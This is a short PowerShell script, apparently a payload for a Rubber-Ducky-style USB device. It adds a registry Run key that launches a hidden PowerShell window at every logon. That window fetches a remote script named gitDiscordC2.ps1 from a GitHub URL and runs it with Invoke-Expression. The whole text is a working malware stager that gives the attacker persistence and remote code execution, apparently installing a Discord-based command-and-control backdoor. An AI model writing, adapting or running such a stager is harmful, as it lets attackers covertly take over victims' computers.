$taskName = "duckduckduckduck"
$script = 'powershell -WindowStyle Hidden -NoProfile -Command "Invoke-RestMethod -Uri ''https://raw.githubusercontent.com/JH517/DuckyPico/refs/heads/main/gitDiscordC2.ps1'' -Headers @{''Cache-Control''=''no-cache''} | Invoke-Expression"'

# Add the startup entry to the registry
Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name $taskName -Value $script
